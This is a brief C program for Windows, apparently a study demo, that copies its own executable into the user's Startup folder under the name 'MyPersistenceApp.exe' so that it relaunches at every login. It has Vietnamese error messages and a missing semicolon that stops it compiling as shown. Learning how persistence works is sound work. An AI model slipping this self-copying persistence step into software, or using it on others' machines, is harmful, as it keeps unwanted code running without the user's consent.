#include <stdio.h>
#include <windows.h>
#include <shlobj.h>

int StartUp_Folder(){
	char ModulePath[MAX_PATH];
	char Destination[MAX_PATH];
	char StartupPath[MAX_PATH];
	
	if(GetModuleFileNameA(NULL, ModulePath, MAX_PATH) == 0){
		printf("Loi, %lu\n", GetLastError());
		return 1;
	}
	
	if(FAILED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, StartupPath))){
		printf("Khong lay duoc duong dan startup folder\n");
		return 1;
	}
	
	char* FileName = "MyPersistenceApp.exe"

    snprintf(Destination, MAX_PATH, "%s\\%s", StartupPath, FileName);
	
	if(CopyFileA(ModulePath, Destination, FALSE)){
		return 0;
	}else{
		printf("Loi: %lu\n", GetLastError());
		return 1;
	}
}

int main(){
	StartUp_Folder();
		
	printf("...");
    getchar();
    return 0;
}

